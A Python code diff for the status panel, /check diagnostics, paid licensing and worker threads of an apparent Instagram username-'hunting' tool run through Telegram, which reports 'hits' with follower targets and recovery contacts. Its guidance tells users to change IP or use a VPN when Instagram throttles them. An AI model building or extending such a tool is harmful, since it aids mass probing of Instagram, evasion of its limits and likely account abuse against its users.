+            paused_for = f" · paused for <code>{format_duration(secs)}</code>"
+        title = "Hunt Paused"
+        tag = "PAUSE"
+        detail = (
+            f"Workers on standby{paused_for}\n"
+            f"Snapshot · hits <code>{hits_count:,}</code> · "
+            f"gen <code>{generated:,}</code> · uptime <code>{uptime}</code>\n"
+            f"<i>Tap Resume or send /resume to continue.</i>"
+        )
+    return format_action_notice(title, detail, tag)
+
+
+def format_status_quick():
+    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
+    tp = get_throughput_metrics()
+    api_lbl, _ = api_power_label()
+    cloud_lbl, _ = cloud_power_label()
+    with lock:
+        hits_count = hit
+        generated = gen
+        valid_count = valid
+        error_count = errors
+    access = "verified" if operator_access_ok() else "locked"
+    uid = resolve_operator_telegram_id()
+    _, _, plan_info = plan_can_hunt(uid) if uid else (False, "no_user", {})
+    if not isinstance(plan_info, dict) or not plan_info:
+        plan_info = plan_build_snapshot(uid) if uid else {}
+    if plan_info.get("tier") == "admin":
+        plan_lbl = "Admin · unlimited"
+    elif plan_info.get("plan") == PLAN_PREMIUM:
+        plan_lbl = f"Premium · until {license_format_expiry(plan_info.get('expires_at'))}"
+    elif plan_info.get("trial_expired"):
+        plan_lbl = "Free · trial expired"
+    elif plan_info.get("plan") == PLAN_FREE:
+        used = int(plan_info.get("day_count") or 0)
+        limit = int(plan_info.get("limit") or FREE_DAILY_GEN_LIMIT)
+        plan_lbl = f"Free · {used:,}/{limit:,} today"
+    else:
+        plan_lbl = "inactive"
+    return (
+        format_panel_header()
+        + f"<b>{S['btn_dash']} Status</b>\n\n"
+        + f"<b>State</b>  {tg_state_badge()}\n"
+        + tg_row("Plan", plan_lbl)
+        + tg_row("Uptime", uptime)
+        + tg_row("Hits", f"{hits_count:,}")
+        + tg_row("Generated", f"{generated:,}")
+        + tg_row("Valid", f"{valid_count:,}")
+        + tg_row("Errors", f"{error_count:,}")
+        + tg_row("Hits/hr", f"{tp['hits_per_hr']:.1f}")
+        + tg_row("Access", access)
+        + tg_row("API", api_lbl.replace("● ", "").replace("◌ ", ""))
+        + tg_row("Cloud", cloud_lbl.replace("● ", "").replace("◌ ", ""))
+    )
+
+
+def format_api_quick():
+    api_ok = get_api_alive()
+    base = get_api_base_url() or f"http://{ip}:{port}"
+    via = _health_cache.get("api_via") or "—"
+    state = f"{S['live']} ONLINE" if api_ok else f"{S['idle']} OFFLINE"
+    return (
+        format_panel_header()
+        + f"<b>API Gateway</b>\n\n"
+        + tg_row("Status", state)
+        + tg_row("Base URL", base)
+        + tg_row("Route", via)
+        + tg_row("Probe", f"http://{ip}:{port}/alive")
+        + "\n<i>Start endpoint.py on this machine if offline.</i>"
+    )
+
+
+def format_cloud_quick():
+    cloud_ok = get_cloud_alive()
+    state = f"{S['live']} SYNCED" if cloud_ok else f"{S['idle']} OFFLINE"
+    sync_lbl, _ = cloud_sync_label()
+    return (
+        format_panel_header()
+        + f"<b>Cloud Sync</b>\n\n"
+        + tg_row("Supabase", state)
+        + tg_row("Profile", sync_lbl.replace("● ", "").replace("◌ ", ""))
+        + tg_row("Telegram ID", resolve_operator_telegram_id() or "—")
+    )
+
+
+_CHECK_ICON = {"ok": "✅", "fail": "❌", "warn": "⚠️", "skip": "➖"}
+_CHECK_BUFFER_FILLING = 80 if _IS_TERMUX else 200
+_CHECK_BUFFER_STRONG = 360 if _IS_TERMUX else 500
+
+
+def _check_row(status, label, detail=""):
+    icon = _CHECK_ICON.get(status, "·")
+    line = f"  {icon} <b>{html.escape(label)}</b>"
+    if detail:
+        line += f" — {html.escape(str(detail))}"
+    return line
+
+
+def _check_add(checks, *, key, status, label, detail="", fix=""):
+    checks.append({
+        "key": key,
+        "status": status,
+        "label": label,
+        "detail": detail,
+        "fix": fix,
+    })
+
+
+def collect_operator_health_checks(actor_id=None, *, remote=False):
+    """
+    Full diagnostic snapshot for /check.
+    remote=True: cloud/account checks only (admin inspecting another user ID).
+    """
+    actor_id = str(actor_id or resolve_operator_telegram_id() or "").strip()
+    machine_uid = str(resolve_operator_telegram_id() or "").strip()
+    checks = []
+    runtime = {}
+
+    if not actor_id:
+        _check_add(
+            checks, key="telegram", status="fail", label="Telegram account",
+            detail="No operator ID", fix="Link the bot in joint.py first.",
+        )
+        return {"checks": checks, "runtime": runtime, "guidance": [], "actor_id": actor_id}
+
+    if admin_is_admin(actor_id):
+        _check_add(
+            checks, key="plan", status="ok", label="Plan & license",
+            detail="Admin · unlimited",
+        )
+    else:
+        entitled, plan_reason, plan_info = operator_plan_entitled(actor_id)
+        if entitled:
+            if isinstance(plan_info, dict) and plan_info.get("plan") == PLAN_FREE:
+                used = int(plan_info.get("day_count") or 0)
+                limit = int(plan_info.get("limit") or FREE_DAILY_GEN_LIMIT)
+                days_left = int(plan_info.get("days_left") or 0)
+                if used >= limit:
+                    _check_add(
+                        checks, key="plan", status="fail", label="Plan & license",
+                        detail=f"Free daily limit {used:,}/{limit:,}",
+                        fix="Upgrade with /redeem INPA-… for Premium unlimited hunt.",
+                    )
+                else:
+                    _check_add(
+                        checks, key="plan", status="ok", label="Plan & license",
+                        detail=f"Free · {days_left}d left · {used:,}/{limit:,} today",
+                    )
+            elif isinstance(plan_info, dict) and plan_info.get("plan") == PLAN_PREMIUM:
+                _check_add(
+                    checks, key="plan", status="ok", label="Plan & license",
+                    detail=f"Premium · until {license_format_expiry(plan_info.get('expires_at'))}",
+                )
+            else:
+                _check_add(checks, key="plan", status="ok", label="Plan & license", detail="Active")
+        elif plan_reason == "expired":
+            exp = plan_info.get("expires_at") if isinstance(plan_info, dict) else None
+            _check_add(
+                checks, key="plan", status="fail", label="Plan & license",
+                detail=f"Premium expired · {license_format_expiry(exp)}",
+                fix="Your Premium ended — redeem a fresh key: /redeem INPA-XXXX-XXXX-XXXX-XXXX",
+            )
+        elif plan_reason == "trial_expired":
+            _check_add(
+                checks, key="plan", status="fail", label="Plan & license",
+                detail=f"Free trial ended ({FREE_TRIAL_DAYS} days)",
+                fix="Trial is over — grab Premium with /redeem or ask admin for /grant.",
+            )
+        elif plan_reason == "cloud_offline":
+            _check_add(
+                checks, key="plan", status="warn", label="Plan & license",
+                detail="Cloud offline — cannot verify plan",
+                fix="Check internet on the hunt PC, wait 30s, then /check again or /plan.",
+            )
+        else:
+            _check_add(
+                checks, key="plan", status="fail", label="Plan & license",
+                detail="No active trial or license",
+                fix="Send /plan in bot — start free trial or /redeem a Premium key.",
+            )
+
+    if operator_ban_active(actor_id, force=True):
+        _check_add(
+            checks, key="ban", status="fail", label="Account status",
+            detail="Suspended by admin",
+            fix="Your account is paused — contact INPARETO admin to review access.",
+        )
+    else:
+        _check_add(checks, key="ban", status="ok", label="Account status", detail="Not suspended")
+
+    if not admin_is_admin(actor_id):
+        granted, access_state = admin_user_access_granted(actor_id)
+        if granted:
+            _check_add(checks, key="channels", status="ok", label="Required channels", detail="All joins verified")
+        elif access_state == "banned":
+            _check_add(
+                checks, key="channels", status="fail", label="Required channels",
+                detail="Suspended",
+                fix="Contact admin — hunting is disabled for this account.",
+            )
+        elif isinstance(access_state, list):
+            missing = ", ".join(
+                (r.get("preview_name") or "Channel")[:20] for r in access_state[:3]
+            )
+            _check_add(
+                checks, key="channels", status="fail", label="Required channels",
+                detail=f"Missing: {missing or 'joins pending'}",
+                fix="Join every link in the bot, then tap Verify or send /verify in DM.",
+            )
+        else:
+            _check_add(
+                checks, key="channels", status="warn", label="Required channels",
+                detail=str(access_state or "pending")[:60],
+                fix="Open bot DM → complete channel joins → /verify.",
+            )
+    else:
+        _check_add(checks, key="channels", status="ok", label="Required channels", detail="Admin bypass")
+
+    reconcile_operator_hit_group()
+    gid = get_operator_hit_group_id() if actor_id == machine_uid or not remote else (
+        fetch_operator_hit_group_id_for_telegram_user(actor_id) or ""
+    )
+    if actor_id == machine_uid or not remote:
+        hg_ok, hg_reason = operator_hit_group_access_state(force=True)
+    else:
+        hg_ok, hg_reason = (bool(gid), "no_hit_group" if not gid else None)
+    if hg_ok:
+        _check_add(
+            checks, key="hitgroup", status="ok", label="Hit group",
+            detail=f"Linked · bot can post · {gid or '—'}",
+        )
+    elif not gid:
+        _check_add(
+            checks, key="hitgroup", status="fail", label="Hit group",
+            detail="Not linked",
+            fix="Create a private Telegram group → add YOUR bot → promote to admin → "
+            "send /verifyhitgroup inside that group (not DM).",
+        )
+    elif hg_reason == "not_admin":
+        _check_add(
+            checks, key="hitgroup", status="fail", label="Hit group",
+            detail=f"Bot needs admin · {gid}",
+            fix="Open your hit group → bot → Promote to admin (Post messages + Change info) "
+            "→ /verifyhitgroup in the group.",
+        )
+    else:
+        _check_add(
+            checks, key="hitgroup", status="warn", label="Hit group",
+            detail=f"Linked · {hg_reason or 'pending'} · {gid}",
+            fix="Run /verifyhitgroup inside your hit group to refresh bot permissions.",
+        )
+
+    if remote:
+        _check_add(
+            checks, key="device", status="skip", label="This device",
+            detail="Remote check — runtime stats need user's own /check on their PC/phone",
+        )
+        guidance = _build_operator_check_guidance(checks, runtime, remote=True)
+        return {"checks": checks, "runtime": runtime, "guidance": guidance, "actor_id": actor_id}
+
+    linked = is_linked_operator(actor_id) or (actor_id == machine_uid)
+    if machine_uid and actor_id != machine_uid and not admin_is_admin(actor_id):
+        _check_add(
+            checks, key="account", status="warn", label="Bot account",
+            detail=f"This device is linked to {machine_uid}, not you ({actor_id})",
+            fix="Use the Telegram account linked on this hunt PC, or re-link joint.py with your ID.",
+        )
+    elif machine_uid:
+        _check_add(
+            checks, key="account", status="ok", label="Bot account",
+            detail=f"Linked · {machine_uid}",
+        )
+    else:
+        _check_add(
+            checks, key="account", status="fail", label="Bot account",
+            detail="Device not linked",
+            fix="Restart joint.py and complete Telegram linking on this machine.",
+        )
+
+    if is_locally_logged_out():
+        _check_add(
+            checks, key="session", status="fail", label="Device session",
+            detail="Logged out locally",
+            fix="Run joint.py again and link your Telegram bot.",
+        )
+    elif _session_awaiting_verification:
+        _check_add(
+            checks, key="session", status="fail", label="Setup screen",
+            detail="Waiting at terminal setup",
+            fix="Finish plan + channels + hit group in Telegram, then press Enter in the "
+            "joint.py terminal (not stuck on the menu).",
+        )
+    elif read_operator_session_verified(machine_uid or actor_id):
+        _check_add(checks, key="session", status="ok", label="Device session", detail="Verified")
+    else:
+        _check_add(
+            checks, key="session", status="warn", label="Device session",
+            detail="Not fully verified yet",
+            fix="Send /verify in bot DM after joins, then /verifyhitgroup in your hit group.",
+        )
+
+    cloud_ok = get_cloud_alive()
+    _check_add(
+        checks, key="cloud", status="ok" if cloud_ok else "warn", label="Cloud sync",
+        detail="Reachable" if cloud_ok else "Offline / slow",
+        fix="" if cloud_ok else "Check internet — license and hit-group sync need cloud.",
+    )
+
+    api_ok = get_api_alive()
+    _check_add(
+        checks, key="api", status="ok" if api_ok else "fail", label="API gateway (endpoint.py)",
+        detail=get_api_base_url() or f"http://{ip}:{port}" if api_ok else "Offline",
+        fix="" if api_ok else "Start endpoint.py (start-api.sh) on this machine, then /resume.",
+    )
+
+    _refresh_hunt_gateway_meta(force=True)
+    buf = _hunt_gateway_meta.get("buffer")
+    ig_block = float(_hunt_gateway_meta.get("ig_block") or 0.0)
+    try:
+        buf_n = int(buf) if buf is not None else None
+    except (TypeError, ValueError):
+        buf_n = None
+
+    with lock:
+        generated = int(gen)
+        valid_count = int(valid)
+        hits_count = int(hit)
+    idle = max(0.0, time.monotonic() - _last_gen_at)
+    runtime.update(
+        generated=generated,
+        valid=valid_count,
+        hits=hits_count,
+        gen_idle_sec=round(idle, 1),
+        buffer=buf_n,
+        ig_block_sec=round(ig_block, 1),
+        workers_started=_workers_started,
+        panel_live=JACK_PANEL_LIVE,
+        paused=paused,
+        manual_pause=_user_manual_paused,
+        api_auto_pause=_api_auto_paused,
+        access_blocked=ACCESS_BLOCKED,
+        hunt_block=hunt_block_reason(),
+        threads=THREAD_COUNT,
+        min_followers=MIN_FOLLOWERS,
+    )
+
+    if not _workers_started:
+        _check_add(
+            checks, key="workers", status="fail", label="Hunt workers",
+            detail="Not started",
+            fix="Pass the setup screen in terminal (press Enter after /verify) — workers start after that.",
+        )
+    elif _user_manual_paused:
+        _check_add(
+            checks, key="workers", status="fail", label="Hunt workers",
+            detail="Paused manually",
+            fix="You paused hunt — send /resume in bot or tap Resume on the panel.",
+        )
+    elif _api_auto_paused:
+        _check_add(
+            checks, key="workers", status="fail", label="Hunt workers",
+            detail="Auto-paused (API was offline)",
+            fix="Bring endpoint.py back online, wait ~10s, hunt resumes automatically or /resume.",
+        )
+    elif not pause_event.is_set():
+        block = hunt_block_reason() or "standby"
+        _check_add(
+            checks, key="workers", status="fail", label="Hunt workers",
+            detail=f"Standby · {block}",
+            fix=_check_worker_fix_for_block(block),
+        )
+    else:
+        _check_add(
+            checks, key="workers", status="ok", label="Hunt workers",
+            detail=f"Running · {len(worker_threads) or THREAD_COUNT} threads",
+        )
+
+    if buf_n is None:
+        _check_add(
+            checks, key="buffer", status="warn", label="Username buffer",
+            detail="Unknown (API probe failed)",
+            fix="Fix endpoint.py first — buffer lives on the local API.",
+        )
+    elif buf_n <= 0:
+        _check_add(
+            checks, key="buffer", status="warn", label="Username buffer",
+            detail="Empty · refilling",
+            fix="Buffer is empty — wait 30–60s. If it stays 0, restart endpoint.py.",
+        )
+    elif buf_n >= _CHECK_BUFFER_STRONG:
+        _check_add(
+            checks, key="buffer", status="ok", label="Username buffer",
+            detail=f"Healthy · {buf_n:,} ready (pipeline OK)",
+        )
+    elif buf_n >= _CHECK_BUFFER_FILLING:
+        _check_add(
+            checks, key="buffer", status="ok", label="Username buffer",
+            detail=f"Filling · {buf_n:,} ready",
+        )
+    else:
+        _check_add(
+            checks, key="buffer", status="warn", label="Username buffer",
+            detail=f"Low · {buf_n:,} (buffer target {_min_followers_display()})",
+            fix="Buffer is low — API may be slow or IG throttled. Give it a minute or restart endpoint.",
+        )
+
+    if ig_block > 2.0:
+        _check_add(
+            checks, key="ig", status="warn", label="Instagram cooldown",
+            detail=f"{ig_block:.0f}s remaining",
+            fix="Instagram asked us to slow down — hunt resumes automatically when cooldown ends.",
+        )
+    else:
+        _check_add(checks, key="ig", status="ok", label="Instagram cooldown", detail="Clear")
+
+    if generated == 0 and idle > 90 and api_ok:
+        _check_add(
+            checks, key="gen", status="fail", label="Generation",
+            detail=f"0 generated · idle {idle:.0f}s",
+            fix="",
+        )
+    elif generated == 0:
+        _check_add(
+            checks, key="gen", status="warn", label="Generation",
+            detail="0 so far — session just started or waking up",
+        )
+    else:
+        _check_add(
+            checks, key="gen", status="ok", label="Generation",
+            detail=f"{generated:,} usernames · valid {valid_count:,} · hits {hits_count:,}",
+        )
+
+    guidance = _build_operator_check_guidance(checks, runtime, remote=False)
+    return {"checks": checks, "runtime": runtime, "guidance": guidance, "actor_id": actor_id}
+
+
+def _check_worker_fix_for_block(block):
+    block = (block or "").lower()
+    if "access gate" in block:
+        return "Access gate is on — /verify in bot + /verifyhitgroup in your hit group."
+    if "suspended" in block:
+        return "Account suspended — contact admin."
+    if "plan" in block or "limit" in block or "trial" in block:
+        return "Plan issue — /plan and /redeem if needed."
+    if "logged out" in block:
+        return "Session logged out — restart joint.py."
+    if "buffer empty" in block:
+        return "Buffer empty — wait or restart endpoint.py."
+    if "api" in block:
+        return "Start endpoint.py on this device."
+    return "Send /resume · open Live Panel (press 1 in terminal) · run /check again."
+
+
+def _build_operator_check_guidance(checks, runtime, *, remote=False):
+    """Friendly prioritized fixes — special case: 0 gen + full buffer ≠ IP issue."""
+    guidance = []
+    fails = [c for c in checks if c.get("status") == "fail"]
+    warns = [c for c in checks if c.get("status") == "warn"]
+
+    for item in fails:
+        fix = (item.get("fix") or "").strip()
+        if fix:
+            guidance.append(fix)
+
+    gen = int(runtime.get("generated") or 0)
+    buf = runtime.get("buffer")
+    api_ok = any(c.get("key") == "api" and c.get("status") == "ok" for c in checks)
+    buffer_healthy = isinstance(buf, int) and buf >= _CHECK_BUFFER_FILLING
+    has_fail = bool(fails)
+
+    if remote:
+        if not guidance:
+            guidance.append(
+                "Cloud-side looks fine — ask the user to run /check on their own hunt device "
+                "for live generation and buffer stats."
+            )
+        return guidance[:8]
+
+    workers_ok = any(c.get("key") == "workers" and c.get("status") == "ok" for c in checks)
+    if buffer_healthy and api_ok and not workers_ok:
+        guidance.insert(
+            0,
+            "Buffer is full — usernames are ready, so this is <b>not an IP problem</b>. "
+            "Hunt was auto-paused by a probe blip. Send <code>/resume</code> or press "
+            "<b>1</b> for Live Panel. Hit enrich never pauses hunt anymore.",
+        )
+    elif gen == 0 and not has_fail and buffer_healthy and api_ok:
+        guidance.insert(
+            0,
+            "Hey — good news: your buffer is filling and the API is healthy, so this is "
+            "<b>not an IP/network problem</b>. Usernames are ready — hunt workers are just "
+            "not consuming them yet. Press <b>1</b> for Live Panel in the joint.py terminal, "
+            "send <code>/resume</code>, and make sure you passed the setup screen (Enter after /verify).",
+        )
+    elif gen == 0 and not has_fail and api_ok and not buffer_healthy:
+        guidance.insert(
+            0,
+            "Setup looks mostly fine but the username buffer is still low or empty. "
+            "Wait 1–2 minutes for refill. If it stays empty, restart <code>endpoint.py</code>. "
+            "If buffer fills but gen stays 0, try a fresh IP (mobile hotspot) — IG may be "
+            "throttling this network.",
+        )
+    elif gen == 0 and not has_fail and api_ok and buffer_healthy and not workers_ok:
+        guidance.insert(
+            0,
+            "Buffer is healthy — pipeline is fine, not an IP issue. Hunt is paused or on standby "
+            "on this device. Open terminal → option <b>1</b> Live Panel, or <code>/resume</code> in bot.",
+        )
+    elif gen == 0 and not has_fail and api_ok and not buffer_healthy and (buf or 0) == 0:
+        guidance.insert(
+            0,
+            "If buffer stays at 0 for several minutes with API online, try changing your IP "
+            "(mobile data / VPN) and restart endpoint.py — Instagram may be blocking generation on this network.",
+        )
+
+    for item in warns:
+        fix = (item.get("fix") or "").strip()
+        if fix and fix not in guidance:
+            guidance.append(fix)
+
+    if not guidance:
+        if gen > 0:
+            guidance.append(
+                "Everything looks healthy — hunt is running. If pace feels slow, check IG cooldown "
+                f"or raise threads with <code>/set threads {THREAD_COUNT}</code>.",
+            )
+        else:
+            guidance.append(
+                "All checks passed — give hunt 30–60 seconds after opening Live Panel. "
+                "Counters update on the dashboard.",
+            )
+
+    return guidance[:8]
+
+
+def format_operator_check_message(actor_id=None, *, remote=False):
+    snap = collect_operator_health_checks(actor_id, remote=remote)
+    checks = snap.get("checks") or []
+    runtime = snap.get("runtime") or {}
+    guidance = snap.get("guidance") or []
+    actor_id = snap.get("actor_id") or "—"
+
+    lines = [
+        format_panel_header(),
+        "<b>🔍 INPARETO Health Check</b>\n",
+        f"<i>Friendly diagnostic for</i> <code>{html.escape(str(actor_id))}</code>\n",
+    ]
+    if remote:
+        lines.append("<i>Admin remote view — device/runtime stats need user&apos;s own /check.</i>\n")
+
+    lines.append(tg_section("CHECKLIST"))
+    for item in checks:
+        lines.append(
+            _check_row(item.get("status"), item.get("label"), item.get("detail"))
+            + "\n",
+        )
+
+    if runtime and not remote:
+        lines.append(tg_section("LIVE STATS"))
+        gen = int(runtime.get("generated") or 0)
+        buf = runtime.get("buffer")
+        buf_lbl = f"{buf:,}" if isinstance(buf, int) else "—"
+        lines.append(tg_row("Generated", f"{gen:,}"))
+        lines.append(tg_row("Buffer", buf_lbl))
+        lines.append(tg_row("Gen idle", f"{runtime.get('gen_idle_sec', 0)}s"))
+        lines.append(tg_row("Min target", _min_followers_display()))
+        lines.append(tg_row("Threads", str(runtime.get("threads", THREAD_COUNT))))
+        if runtime.get("hunt_block"):
+            lines.append(tg_row("Block reason", str(runtime.get("hunt_block"))[:48]))
+        lines.append("")
+
+    lines.append(tg_section("WHAT TO DO"))
+    if guidance:
+        for idx, tip in enumerate(guidance[:6], 1):
+            if "<b>" in tip or "<code>" in tip:
+                lines.append(f"  {S['bullet']} {tip}\n")
+            else:
+                lines.append(f"  {S['bullet']} {html.escape(tip)}\n")
+    else:
+        lines.append(f"  {S['bullet']} No action needed — you&apos;re good to go.\n")
+
+    fail_n = sum(1 for c in checks if c.get("status") == "fail")
+    warn_n = sum(1 for c in checks if c.get("status") == "warn")
+    ok_n = sum(1 for c in checks if c.get("status") == "ok")
+    lines.append(
+        f"\n<i>Summary: {ok_n} OK · {warn_n} warn · {fail_n} fail"
+        f" — run /check anytime.</i>",
+    )
+    return "".join(lines)
+
+
+def operator_check_reply_keyboard(snap):
+    """Context buttons after /check."""
+    checks = snap.get("checks") or []
+    fails = {c.get("key") for c in checks if c.get("status") == "fail"}
+    rows = []
+    if "channels" in fails:
+        rows.append([{"text": "✓ Verify joins", "callback_data": "VERIFY_JOIN"}])
+    if "hitgroup" in fails:
+        rows.append([{"text": "Verify hit group", "callback_data": "VERIFY_HITGROUP"}])
+    if "plan" in fails:
+        rows.append([{"text": "Plan & redeem", "callback_data": "HELP"}])
+    if not rows:
+        return panel_keyboard("notice")
+    rows.append([{"text": "◈ Dashboard", "callback_data": "STATS"}])
+    return {"inline_keyboard": rows}
+
+
+def access_sync_loop():
+    global ACCESS_BLOCKED
+    was_blocked = False
+    while not _access_sync_stop.is_set():
+        try:
+            if is_locally_logged_out():
+                ACCESS_BLOCKED = True
+                pause_event.clear()
+                was_blocked = True
+                time.sleep(ACCESS_SYNC_INTERVAL_SEC)
+                continue
+            apply_worker_pause_state()
+            if ACCESS_BLOCKED and not was_blocked:
+                if hit_group_recently_delivered() or operator_access_sticky_active():
+                    mark_hit_group_verified_by_delivery()
+                    apply_worker_pause_state()
+                if ACCESS_BLOCKED and not operator_access_sticky_active():
+                    if not _session_awaiting_verification and not JACK_PANEL_LIVE:
+                        print_terminal_access_notice()
+                    if not (JACK_PANEL_LIVE and _operator_hunt_trusted()):
+                        if not _hunt_active_session():
+                            pause_event.clear()
+            was_blocked = ACCESS_BLOCKED
+        except Exception as exc:
+            log_event("ACCESS SYNC", str(exc)[:100])
+        time.sleep(ACCESS_SYNC_INTERVAL_SEC)
+
+
+def _min_followers_display():
+    if MIN_FOLLOWERS_FILTER_ENABLED:
+        return str(MIN_FOLLOWERS)
+    return f"{MIN_FOLLOWERS} (filter off)"
+
+
+def set_min_followers(value):
+    global MIN_FOLLOWERS
+    MIN_FOLLOWERS = max(1, int(value))
+    if MIN_FOLLOWERS_FILTER_ENABLED:
+        log_event("CONFIG", f"Target min set to {MIN_FOLLOWERS}")
+    else:
+        log_event("CONFIG", f"Min target saved {MIN_FOLLOWERS} (filter inactive — API patch)")
+
+
+def set_timeout(value):
+    global TIMEOUT
+    TIMEOUT = max(1, int(value))
+    log_event("CONFIG", f"Timeout set to {TIMEOUT}s")
+
+
+_HUNT_SOFT_BLOCK_HINTS = frozenset({
+    "ig cooldown",
+    "buffer empty",
+    "gen idle",
+    "endpoint backlog",
+    "slow drain",
+})
+
+
+def _is_soft_hunt_block(block):
+    if not block:
+        return False
+    low = str(block).lower()
+    return any(hint in low for hint in _HUNT_SOFT_BLOCK_HINTS)
+
+
+def hunt_block_reason():
+    """Why workers are not generating (None = hunt should be active)."""
+    if not _workers_started:
+        return "workers not started"
+    if is_locally_logged_out():
+        return "logged out"
+    uid = resolve_operator_telegram_id()
+    if TELEGRAM_ENABLED and uid and operator_ban_active(uid, force=False):
+        return "suspended — contact admin"
+    if _api_auto_paused:
+        return "API offline — run endpoint.py"
+    if _user_manual_paused:
+        return "paused (manual)"
+    if not get_api_alive() and not _hunt_recently_ok():
+        if _local_gateway_mode() and pause_event.is_set():
+            return None
+        return "API unreachable"
+    if TELEGRAM_ENABLED and not hunting_license_ok():
+        _, plan_reason, _ = plan_can_hunt()
+        if plan_reason == "daily_limit":
+            return f"free daily limit ({FREE_DAILY_GEN_LIMIT:,}) — /redeem Premium"
+        if plan_reason == "trial_expired":
+            return f"free trial ended — /redeem Premium"
+        return "plan inactive — /plan"
+    # Avoid flicker: rely on access sync loop's gate state rather than doing a fresh check here.
+    if TELEGRAM_ENABLED and ACCESS_BLOCKED:
+        return "access gate — finish Telegram setup"
+    if not pause_event.is_set():
+        return "workers on standby"
+    idle = time.monotonic() - _last_gen_at
+    if idle > 25 and get_api_alive():
+        meta = _hunt_gateway_meta
+        ig_block = float(meta.get("ig_block") or 0.0)
+        if ig_block > 1.0 and not _hunt_gen_recently_active(20):
+            return f"IG cooldown {ig_block:.0f}s"
+        buf = meta.get("buffer")
+        if buf is not None and buf <= 0 and not _hunt_gen_recently_active(20):
+            return "buffer empty — refilling"
+        if idle > 90 and not _hunt_gen_recently_active(30):
+            return f"gen idle {idle:.0f}s"
+    return None
+
+
+def _spawn_hunt_worker():
+    global _next_worker_id
+    with _worker_id_lock:
+        worker_id = _next_worker_id
+        _next_worker_id += 1
+    t = threading.Thread(
+        target=worker,
+        args=(worker_id,),
+        name=f"hunt-worker-{worker_id}",
+        daemon=True,
+    )
+    t.start()
+    worker_threads.append(t)
+
+
+def _note_gen_success():
+    global _last_gen_at
+    _last_gen_at = time.monotonic()
+
+
+def _hunt_pulse_loop():
+    global _pulse_last_gen, _pulse_last_at
+    while True:
+        time.sleep(45)
+        if not _workers_started or is_locally_logged_out():
+            continue
+        with lock:
+            current_gen = gen
+            current_valid = valid
+            current_hit = hit
+        delta = current_gen - _pulse_last_gen
+        elapsed = max(0.1, time.monotonic() - _pulse_last_at)
+        if delta <= 0:
+            idle = time.monotonic() - _last_gen_at
+            block = _hunt_block_reason_live() if JACK_PANEL_LIVE else hunt_block_reason()
+            if block and not _is_soft_hunt_block(block):
+                log_event("PULSE", f"blocked — {block}")
+            elif block:
+                log_event("PULSE", f"throttled — {block}")
+            elif idle > 20:
+                meta = _hunt_gateway_meta
+                log_event(
+                    "PULSE",
+                    f"gen idle {idle:.0f}s · buf {meta.get('buffer', '?')} · "
+                    f"IG {float(meta.get('ig_block') or 0):.0f}s · "
+                    f"pause={'Y' if pause_event.is_set() else 'N'}",
+                )
+        else:
+            rate = delta / elapsed * 60.0
+            log_event(
+                "PULSE",
+                f"+{delta} gen ({rate:.0f}/min) · total {current_gen:,} · "
+                f"valid {current_valid} · hits {current_hit}",
+            )
+        _drain_hit_deep_idle_queue()
+        _pulse_last_gen = current_gen
+        _pulse_last_at = time.monotonic()
+
+
+def _start_hunt_pulse_thread():
+    global _hunt_pulse_started
+    if _hunt_pulse_started:
+        return
+    _hunt_pulse_started = True
+    threading.Thread(
+        target=_hunt_pulse_loop, daemon=True, name="hunt-pulse",
+    ).start()
+
+
+def start_hunt_workers():
+    """Start background hunt threads once (safe to call multiple times)."""
+    global _workers_started
+    if _workers_started:
+        apply_worker_pause_state()
+        return
+    apply_worker_pause_state()
+    _init_session_hits_file()
+    for _ in range(THREAD_COUNT):
+        _spawn_hunt_worker()
+    _workers_started = True
+    _warmup_probes_once()
+    apply_worker_pause_state()
+    _start_hunt_pulse_thread()
+    block = hunt_block_reason()
+    if block:
+        log_event("CONFIG", f"Workers online ({THREAD_COUNT}) — blocked: {block}")
+    else:
+        log_event("CONFIG", f"Hunt workers online ({THREAD_COUNT} threads · full cycle)")
+    log_event(
+        "CONFIG",
+        f"Hunt net-blip: {HUNT_BLIP_PAUSE_SEC:.1f}s pause after {HUNT_BLIP_TRIGGER} fails",
+    )
+    mode = "hunt_cycle (1 HTTP)" if HUNT_USE_CYCLE else "legacy buffered /ig_gen"
+    log_event(
+        "CONFIG",
+        f"Hunt profile: {HUNT_PROFILE} · IG {HUNT_IG_LOOKUP_ROUTE} · {mode} · slots {HUNT_GATEWAY_CONCURRENCY} · {THREAD_COUNT} workers",
+    )
+    if _IS_TERMUX:
+        log_event(
+            "CONFIG",
+            f"Termux tune: {THREAD_COUNT}w · {HUNT_GATEWAY_CONCURRENCY} gateway slots · "
+            f"ig_gen read {HUNT_IG_GEN_READ_TIMEOUT}s · export JACK_THREADS=64 before endpoint.py",
+        )
+    else:
+        log_event(
+            "CONFIG",
+            f"Desktop hunt: {THREAD_COUNT} workers · {HUNT_GATEWAY_CONCURRENCY} gateway slots · "
+            f"cycle timeout {HUNT_CYCLE_TIMEOUT}s",
+        )
+    log_event("CONFIG", "Hit alerts: real IG recovery contact only (no fake email)")
+    if TELEGRAM_ENABLED and not ACCESS_BLOCKED:
+        mark_operator_access_verified()
+
+
+def set_thread_count(value):
+    global THREAD_COUNT
+    target = max(1, int(value))
+    THREAD_COUNT = target
+    slots = _hunt_gateway_slots_for_threads(target)
+    _resize_hunt_gateway_sem(slots)
+    if not _workers_started:
+        log_event(
+            "CONFIG",
+            f"Worker target {target} · gateway slots {slots} (restart endpoint.py if slots changed)",
+        )
+        return
+    current_threads = len(worker_threads)
+    if target > current_threads:
+        for _ in range(target - current_threads):
+            _spawn_hunt_worker()
+        log_event("CONFIG", f"Expanded worker threads to {target} · gateway slots {slots}")
+    else:
+        log_event("CONFIG", f"Worker target {target} · gateway slots {slots} (active: {current_threads})")
+
+
+def bump_min_followers(delta):
+    set_min_followers(MIN_FOLLOWERS + delta)
+
+
+def bump_thread_count(delta):
+    set_thread_count(THREAD_COUNT + delta)
+
+
+def set_live_watch(active, chat_id=None, message_id=None):
+    global LIVE_WATCH
+    LIVE_WATCH = active
+    if active and chat_id and message_id:
+        LIVE_PANEL["chat_id"] = str(chat_id)
+        LIVE_PANEL["message_id"] = message_id
+        LIVE_PANEL["view"] = "stats"
+        log_event("CONFIG", "Live dashboard refresh enabled")
+    else:
+        LIVE_PANEL["chat_id"] = None
+        LIVE_PANEL["message_id"] = None
+        LIVE_PANEL["view"] = None
+        if not active:
+            log_event("CONFIG", "Live dashboard refresh disabled")
+
+
+def update_live_panel_tracking(callback, callback_data):
+    """Keep live auto-edit on dashboard only; pause when other panels are open."""
+    if not LIVE_WATCH:
+        return
+    chat_id, message_id, _ = panel_message_from_callback(callback)
